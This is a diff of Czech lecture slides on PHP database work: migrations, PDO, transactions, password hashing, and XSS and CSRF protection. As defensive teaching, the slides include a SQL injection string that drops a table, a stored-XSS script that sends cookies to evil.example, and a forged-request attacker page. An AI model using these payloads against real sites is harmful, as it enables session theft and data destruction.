@@ -26,7 +26,7 @@
 - Doménový model – E-R diagram nebo diagram tříd
 	- Identifikace entit – vlastnosti, jejich typ
 	- Identifikace vztahů – kardinalita 
-- Transformace na schéma databáze – _viz IDS, také v další přednášce_
+- Transformace na schéma databáze – viz IDS, také v další přednášce
 	- Entity na tabulky, vlastnosti na sloupce
 	- Vztahy: vazba primární – cizí klíč, příp. vazební tabulky
 - Primární klíč, indexy
@@ -40,8 +40,8 @@
 	- Praktické problémy – vše se může změnit
 - Umělý primární klíč
 	- Je nutné zajistit unikátnost v rámci tabulky
-	- Generované cizí klíče – různá podpora v db systémech
-	- MySQL: volba auto_increment u primárního klíče
+	- Generované primární klíče – různá podpora v db systémech
+	- MySQL: volba `AUTO_INCREMENT` u primárního klíče
 
 ---
 
@@ -61,7 +61,7 @@
 
 ```sql
 CREATE DATABASE demo;
-CREATE USER 'demo2'@'localhost' IDENTIFIED WITH 'password';
+CREATE USER 'demo2'@'localhost' IDENTIFIED BY 'password';
 GRANT ALL PRIVILEGES ON `demo`.* TO 'demo2'@'localhost';
 ```
 
@@ -70,7 +70,7 @@ GRANT ALL PRIVILEGES ON `demo`.* TO 'demo2'@'localhost';
 
 ```sql
 CREATE TABLE `users`(
-	`id` INT NOT NULL,
+	`id` INT NOT NULL AUTO_INCREMENT,
 	`name` VARCHAR(255) NOT NULL,
 	`surname` VARCHAR(255) NOT NULL,
 	 PRIMARY KEY (`id`))
@@ -79,10 +79,71 @@ ENGINE = InnoDB;
 
 ---
 
+# Vývoj schématu databáze
+- Schéma se během vývoje mění spolu s kódem aplikace
+	- Nové tabulky a sloupce, změny typů, indexy
+- Databáze existuje v několika **prostředích**
+	- Lokálně u každého vývojáře, testovací server, produkční server
+	- Kód verzujeme v gitu, ale co databáze?
+- Ruční změny (konzole, phpMyAdmin) jsou problematické
+	- Nejsou nikde zaznamenány, nelze je spolehlivě zopakovat
+	- Nevíme, které změny už v daném prostředí proběhly
+	- Kód a schéma databáze se rozejdou
+
+---
+
+# Migrace databáze
+- Každá změna schématu je samostatný **skript** uložený v gitu spolu s kódem
+	- Číslované (časové razítko) – pevné pořadí provádění
+
+```
+migrations/
+	001_create_users.sql
+	002_add_email_to_users.sql
+	003_create_orders.sql
+```
+
+- V databázi je **tabulka provedených migrací**
+	- Při nasazení se provedou pouze nové migrace
+- Provedenou migraci **neměníme** – opravu řešíme novou migrací
+- Případně i zpětný krok (`up` / `down`)
+- Odlišit od tzv. *seed* dat – výchozí nebo testovací obsah databáze
+
+---
+
+# Jednoduchá implementace migrací
+- Spouštíme z příkazové řádky (`php migrate.php`), ne přes web
+
+```php
+$pdo->exec("CREATE TABLE IF NOT EXISTS migrations
+	(name VARCHAR(255) PRIMARY KEY)");
+$done = $pdo->query("SELECT name FROM migrations")
+	->fetchAll(PDO::FETCH_COLUMN);
+foreach (glob(__DIR__ . '/migrations/*.sql') as $file) { // seřazeno
+	$name = basename($file);
+	if (in_array($name, $done, true)) continue;
+	$pdo->exec(file_get_contents($file));
+	$pdo->prepare("INSERT INTO migrations VALUES (?)")->execute([$name]);
+}
+```
+
+- Hotové nástroje: Phinx, Doctrine Migrations, migrace ve frameworcích
+
+---
+
 # Spolupráce s databázovým serverem
 - Aplikace v PHP běží na serveru dávkově
 - Celou komunikaci s databází je třeba řešit v rámci zpracování jednoho HTTP požadavku.
 - Demo: [GitHub](https://github.com/DIFS-Teaching/basic-demos/tree/master/php-forms-pdo)
+
+---
+
+# Struktura demo aplikace
+<!-- .slide: class="normal centered" -->
+
+![Vrstvy demo aplikace](assets/vrstvy-demo.svg) <!-- .element: style="height:680px;margin:0 auto;display:block" -->
+
+Prezentace nikdy nepracuje s SQL ani PDO, datová vrstva neobsahuje pravidla aplikace. <!-- .element: class="small" -->
 
 ---
 
@@ -94,19 +155,20 @@ ENGINE = InnoDB;
 3. Zaslání SQL dotazu
 	- Získáme výsledek dotazu
 4. Převzetí a zpracování výsledků
-	- _(případně zpět k bodu 3)_
-5. Ukončení spojení _(často na pozadí)_
+	- (případně zpět k bodu 3)
+5. Ukončení spojení (často na pozadí)
 
 ---
 
 # Relační databáze v PHP
 - Historicky vlastní API pro každý databázový systém
 	- Typicky sada funkcí v PHP
-	- Např. `mysql_xxxx()`
+	- Např. `mysql_xxxx()` – odstraněno v PHP 7.0
+	- Dodnes např. `mysqli` (pouze MySQL/MariaDB), `pgsql`
 - Snaha o sjednocení
 	- Abstraktní vrstva s ovladači pro různé systémy
 	- PHP Data Objects (PDO) – standard v PHP od verze 5.1
-	- Existují různé další alternativy třetích stran
+	- Další abstrakce třetích stran, např. Doctrine DBAL, Nette Database, Laravel Query Builder (viz frameworky)
 
 ---
 
@@ -115,48 +177,51 @@ ENGINE = InnoDB;
 - Poskytuje **standardní rozhraní** pro základní operace
 	- Objektově orientované rozhraní
 - Toto rozhraní implementují **ovladače** (_drivers_) pro jednotlivé konkrétní systémy
-	- Např. MS SQL, Firebird, IBM, Informix, MySQL, Oracle, DB2, PostgreSQL, SQLite, …
-	- Viz [dokumentace k PDO](http://php.net/manual/en/book.pdo.php)
+	- Součástí PHP: MySQL/MariaDB, PostgreSQL, SQLite, Firebird, ODBC, MS SQL/Sybase (dblib)
+	- Samostatně instalované (PECL, výrobce): Oracle (od PHP 8.4), IBM DB2, Informix, MS SQL Server (`pdo_sqlsrv`)
+	- Viz [dokumentace k PDO](https://www.php.net/manual/en/book.pdo.php)
 
 ---
 
 # Připojení k databázi
 - Vytvoření instance třídy PDO
 - Specifikace spojení pomocí DSN (data source name)
-
+	- Včetně kódování spojení – `utf8mb4` (`utf8` je v MySQL jen 3bajtový `utf8mb3`)
 
 ```php
 <?php
-$dsn = 'mysql:host=localhost;dbname=testdb';
-$username = 'username';
-$password = 'password';
-$options = array(
-    PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8',
-); 
+$dsn = 'mysql:host=localhost;dbname=testdb;charset=utf8mb4';
+$username = 'username';
+$password = 'password';
+$options = [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,      // výchozí od PHP 8.0
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, // výchozí je FETCH_BOTH
+];
 
-$pdo = new PDO($dsn, $username, $password, $options);
+$pdo = new PDO($dsn, $username, $password, $options);
 ```
 
 ---
 
 # Zaslání SQL dotazu
-- Jednorázový dotaz: PDO::query
+- Dotaz bez parametrů: `PDO::query()`
 
 ```php
 $stmt = $pdo->query("SELECT name, surname FROM users");
 ```
 
-- Opakovaný dotaz: PDO::prepare a PDO::execute
+- Dotaz s parametry: `PDO::prepare()` a `PDOStatement::execute()`
+	- Připravený dotaz lze vykonat i opakovaně s jinými parametry
 
 ```php
 // Připravení dotazu
 $stmt = $pdo->prepare("SELECT name, surname 
 	FROM users WHERE id = ?");
 // Vykonání dotazu
-$stmt->execute(array($userId));
+$stmt->execute([$userId]);
 ```
 
-- Získáme tzv. _statement_ ($result)
+- Získáme objekt _statement_ (`PDOStatement`)
 - **Parametry:** prevence SQL injection, viz dále
 
 ---
@@ -166,15 +231,15 @@ $stmt->execute(array($userId));
 - Sloupce výsledné tabulky odpovídají projekci v příkazu SELECT.
 
 ```php
-while ($row = $stmt->fetch())
+while ($row = $stmt->fetch())
 {
-    echo $row['name'] . "\n";
+    echo $row['name'] . "\n";
 
-    echo $row['surname'] . "\n";
+    echo $row['surname'] . "\n";
 }
 ```
 
-- Alternativně přístup ke sloupcům přes indexy.
+- Režim lze zvolit i pro jednotlivé volání: `fetch(PDO::FETCH_NUM)` – indexy sloupců, `PDO::FETCH_ASSOC` – jména sloupců, `PDO::FETCH_BOTH` – obojí
 
 ---
 
@@ -183,9 +248,8 @@ while ($row = $stmt->fetch())
 - Opatrně: počet řádků je nutno omezit, např. pomocí `WHERE` (na rovnost), `LIMIT` apod.
 
 ```php
-$stmt = $pdo->prepare("SELECT name, surname
+$stmt = $pdo->query("SELECT name, surname
 	FROM users LIMIT 100");
-$stmt->execute();
 $data = $stmt->fetchAll();
 foreach ($data as $row) {
 	echo $row["name"] . "\n";
@@ -199,19 +263,19 @@ foreach ($data as $row) {
 - Naivní (starý) přístup – <span style="color:red">NEBEZPEČNÉ</span>
 
 ```php
-$sql = "SELECT * FROM users WHERE name='$name'";
+$sql = "SELECT * FROM users WHERE name='$name'";
 ```
 
 - Pokud (např. uživatelský vstup) 
 ```php
-$name = "franta';DROP TABLE users; -- ";
+$name = "franta';DROP TABLE users; -- ";
 ```
 
 - Dostaneme
 
 ```sql
-SELECT * FROM users
-	WHERE name = 'franta'; DROP TABLE users; -- '
+SELECT * FROM users
+	WHERE name = 'franta'; DROP TABLE users; -- '
 ```
 
 ---
@@ -219,19 +283,35 @@ SELECT * FROM users
 # Parametrizované dotazy v PDO
 
 ```php
-$stmt = $pdo->prepare('SELECT * FROM users
-				WHERE email = ? AND status = ?');
-$stmt->execute([$email, $status]);
-$user = $stmt->fetch();
+$stmt = $pdo->prepare('SELECT * FROM users
+				WHERE email = ? AND status = ?');
+$stmt->execute([$email, $status]);
+$user = $stmt->fetch();
 ```
 
 nebo
 
 ```php
-$stmt = $pdo->prepare('SELECT * FROM users
-				WHERE email = :email AND status = :status');
-$stmt->execute(['email' => $email, 'status' => $status]);
-$user = $stmt->fetch();
+$stmt = $pdo->prepare('SELECT * FROM users
+				WHERE email = :email AND status = :status');
+$stmt->execute(['email' => $email, 'status' => $status]);
+$user = $stmt->fetch();
+```
+
+---
+
+# Omezení parametrů
+- Parametr může nahradit pouze **hodnotu** v dotazu
+- Nelze jej použít pro názvy tabulek a sloupců, směr řazení (`ASC`/`DESC`), klíčová slova SQL
+- Pokud tyto části závisí na vstupu: **whitelist** povolených hodnot
+
+```php
+$allowed = ['name', 'surname'];
+$sort = $_GET['sort'] ?? 'name';
+if (!in_array($sort, $allowed, true)) {
+	$sort = 'name';
+}
+$stmt = $pdo->query("SELECT * FROM users ORDER BY $sort");
 ```
 
 ---
@@ -241,8 +321,8 @@ $user = $stmt->fetch();
 
 ```php
 $stmt = $pdo->prepare("
-	INSERT INTO uzivatel (name, surname) VALUES(?, ?)");
-$stmt->execute([$jmeno, $prijmeni]);
+	INSERT INTO users (name, surname) VALUES (?, ?)");
+$stmt->execute([$name, $surname]);
 ```
 
 - Generované ID: `$pdo->lastInsertId()`
@@ -251,19 +331,130 @@ $stmt->execute([$jmeno, $prijmeni]);
 
 ```php
 $stmt = $pdo->prepare("
-	UPDATE uzivatele SET name = ?, surname = ?
+	UPDATE users SET name = ?, surname = ?
 	WHERE id = ?");
-$stmt->execute([$jmeno, $prijmeni, $idUzivatele]);
+$stmt->execute([$name, $surname, $userId]);
+```
+
+---
+
+# Ošetření chyb
+- Chyba databáze vyvolá výjimku `PDOException` (výchozí od PHP 8.0)
+	- `$e->getCode()` – kód SQLSTATE, např. `23000` porušení integrity
+- Podrobnosti chyby **nevypisovat uživateli** – prozrazují strukturu databáze
+
+```php
+try {
+	$stmt = $pdo->prepare("INSERT INTO users (name, surname)
+		VALUES (?, ?)");
+	$stmt->execute([$name, $surname]);
+} catch (PDOException $e) {
+	error_log($e->getMessage());    // podrobnosti do logu
+	echo "Uložení se nezdařilo.";   // uživateli obecná zpráva
+}
+```
+
+---
+
+# Transakce
+- Skupina operací, které se provedou buď všechny, nebo žádná
+- `beginTransaction()`, `commit()`, `rollBack()`
+
+```php
+try {
+	$pdo->beginTransaction();
+	$stmt = $pdo->prepare("UPDATE accounts
+		SET balance = balance + ? WHERE id = ?");
+	$stmt->execute([-$amount, $fromId]);
+	$stmt->execute([$amount, $toId]);
+	$pdo->commit();
+} catch (Exception $e) {
+	$pdo->rollBack();   // zrušení všech změn od beginTransaction()
+	throw $e;
+}
 ```
 
 ---
 
 # Uživatelské účty v databázi
-- Tabulka uživatelů se sloupci login a password
+- Tabulka uživatelů se sloupci login a hash hesla
 - Hesla se nesmí ukládat v otevřené podobě
-	- Nutno použít hashovací funkci
-	- V PHP např. `password_hash()` a `password_verify()`
+	- **Pomalá** hashovací funkce se solí (bcrypt, Argon2id), ne MD5 či SHA
+- `password_hash($password, PASSWORD_DEFAULT)`
+	- Výsledek obsahuje algoritmus, parametry i sůl; nyní bcrypt
+	- Sloupec pro hash: `VARCHAR(255)` – délka se může změnit
+- `password_verify($password, $hash)` – ověření hesla
+- `password_needs_rehash()` – přepočet po změně algoritmu nebo parametrů
 - [Demo aplikace](https://github.com/DIFS-Teaching/basic-demos/tree/master/php-login-db)
+
+---
+
+# Cross-Site Scripting (XSS)
+- Data z databáze (původně od uživatele) vypisujeme do HTML stránky
+- Pokud obsahují HTML/JavaScript, prohlížeč je provede v kontextu naší aplikace
+	- Krádež session, akce jménem uživatele, podvržený obsah stránky
+- **Uložené (stored) XSS** – útočný kód je uložen v databázi a zasáhne každého, kdo si stránku zobrazí
+
+```php
+// jméno uložené v DB:
+// <script>fetch('https://evil.example/?c=' + document.cookie)</script>
+echo "<td>" . $row['name'] . "</td>";   // NEBEZPEČNÉ
+```
+
+---
+
+# Ochrana proti XSS
+- **Escapovat při výstupu** podle kontextu
+	- HTML: `htmlspecialchars()` – převede `< > & " '` na entity
+	- Do databáze ukládáme data v původní podobě
+- Šablonovací systémy (Blade, Twig, Latte) escapují automaticky
+- Doplňková ochrana: cookie `HttpOnly`, hlavička `Content-Security-Policy`
+
+```php
+function h($s) {
+	return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
+}
+
+echo "<td>" . h($row['name']) . "</td>";
+?>
+<input name="name" value="<?= h($person['name']) ?>">
+```
+
+---
+
+# Cross-Site Request Forgery (CSRF)
+- Uživatel je přihlášen v naší aplikaci (session cookie)
+- Navštíví cizí stránku, která odešle požadavek na naši aplikaci
+- Prohlížeč k požadavku přiloží cookie → provede se **s právy uživatele**
+- Např. stránka útočníka obsahuje:
+
+```html
+<img src="https://is.example/person_delete.php?id=1&confirmed=yes">
+
+<form action="https://is.example/person_edit.php?id=1" method="post">
+	<input type="hidden" name="name" value="Hacked">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+# Ochrana proti CSRF
+- Operace měnící data **nikdy přes GET**
+- **CSRF token** – náhodná hodnota v session a ve skrytém poli formuláře; cizí stránka ji nezná
+- Doplňková ochrana: cookie `SameSite=Lax` nebo `Strict`
+- Frameworky řeší automaticky (Laravel `@csrf`, Symfony, Nette)
+
+```php
+// vytvoření tokenu (jednou pro session)
+$_SESSION['csrf_token'] ??= bin2hex(random_bytes(32));
+// ve formuláři: <input type="hidden" name="csrf_token" value="...">
+// ověření při zpracování formuláře
+if (!isset($_POST['csrf_token'])
+		|| !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+	http_response_code(403); exit();
+}
+```
 
 ---
 
@@ -271,5 +462,5 @@ $stmt->execute([$jmeno, $prijmeni, $idUzivatele]);
 - Složitější schéma databáze
 	- Vztahy, kolekce
 	- Integrita a konzistence databáze
-- Složitější operace nad databází
-	- Transakce
+- Abstrakce databázové vrstvy ve frameworcích
+	- Query builder, objektově relační mapování (ORM)
